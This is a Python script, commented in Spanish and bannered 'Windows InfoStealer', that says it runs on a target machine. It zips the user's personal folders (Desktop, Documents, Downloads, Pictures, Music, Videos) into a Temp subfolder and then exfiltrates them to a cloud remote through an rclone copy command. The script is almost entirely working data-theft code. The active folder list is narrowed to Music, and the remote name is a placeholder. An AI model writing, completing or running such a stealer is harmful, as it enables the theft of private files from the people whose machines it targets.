

# 0.Titulo descripcion y autor


print(r"""
Herramienta:
 __        ___           _                     ___        __      ____  _             _           
 \ \      / (_)_ __   __| | _____      _____  |_ _|_ __  / _| ___/ ___|| |_ ___  __ _| | ___ _ __ 
  \ \ /\ / /| | '_ \ / _` |/ _ \ \ /\ / / __|  | || '_ \| |_ / _ \___ \| __/ _ \/ _` | |/ _ \ '__|
   \ V  V / | | | | | (_| | (_) \ V  V /\__ \  | || | | |  _| (_) |__) | ||  __/ (_| | |  __/ |   
    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/ |___|_| |_|_|  \___/____/ \__\___|\__,_|_|\___|_|   
                                                                                                  
""")


print("Este programa se ejecuta en el equipo target y hace lo siguiente:" \
"1.Recopila todos los directorios importantes de Windows" \
"2.Los copia y los guarda en un directorio de Temp" \
"3.Comprime cada uno de ellos usando zipfile" \
"4.Los exfiltra a la nube usando rclone" \
"(No es persistente)")






# 1.Importar librerias necesarias

import os
import zipfile
from rclone_python import rclone
from rclone_python.remote_types import RemoteTypes
import subprocess



# 2.Crear la subcarpeta "datos_directorios" dentro de Temp
ruta_temp = os.path.join(os.path.expandvars(r"%temp%"), "datos_directorios")
if not os.path.isdir(ruta_temp):
    os.mkdir(ruta_temp)
    print(f"La carpeta {ruta_temp} ha sido creada.")
    print("Aquí se guardarán las copias de los directorios Escritorio, Documentos... etc")
elif os.path.isdir(ruta_temp):
    print(f"La carpeta {ruta_temp} ya existe. No hace falta crearla de nuevo.")
    print("Aquí se guardarán las copias de los directorios Escritorio, Documentos... etc")
else:
    print("Error con el directorio Temp.")
    exit()
print("")



# 3.Definir los directorios sensibles
Escritorio = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Desktop")
Descargas = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Downloads")
Documentos = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Documents")
Imagenes = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Pictures") 
Musica = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Music")
Videos = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Videos")

# lista_directorios = [Escritorio, Descargas, Documentos, Imagenes, Musica, Videos]
lista_directorios = [Musica]


# 4.Comprobar cada directorio:
for directorio in lista_directorios:
    if not os.path.isdir(directorio):
        print(f"El directorio {directorio} no ha podido ser reconocido.")
        exit()
    elif os.path.isdir(directorio):
        print(f"El directorio {directorio} si ha podido ser reconocido correctamente.")
    else:
        print(f"Error con el directorio {directorio}")
        exit()
print("")



# 5. Comprimir cada directorio en archivos .zip independientes dentro de ruta_temp
print("Comprimiendo directorios...")
for directorio in lista_directorios:
    nombre = os.path.basename(directorio)
    archivo_zip = os.path.join(ruta_temp, f"{nombre}.zip")
    
    with zipfile.ZipFile(archivo_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(directorio):
            for file in files:
                try:
                    ruta_completa = os.path.join(root, file)
                    ruta_relativa = os.path.relpath(ruta_completa, directorio)
                    zipf.write(ruta_completa, arcname=ruta_relativa)
                except:
                    pass # Ignora archivos bloqueados individualmente

print("\n¡Proceso completado con éxito! Las copias están en la carpeta datos_directorios dentro de Temp.")

# Imprimir resultado:
archivos_zip = os.listdir(ruta_temp)
print(archivos_zip)



# 5.Subir datos a la nube con rclone
# pip install rclone-python   
# Descargar la herramienta en https://rclone.org/

subprocess.run(["rclone", "copy", ruta_temp, "tu_remoto:backup_directorios", "--progress"])
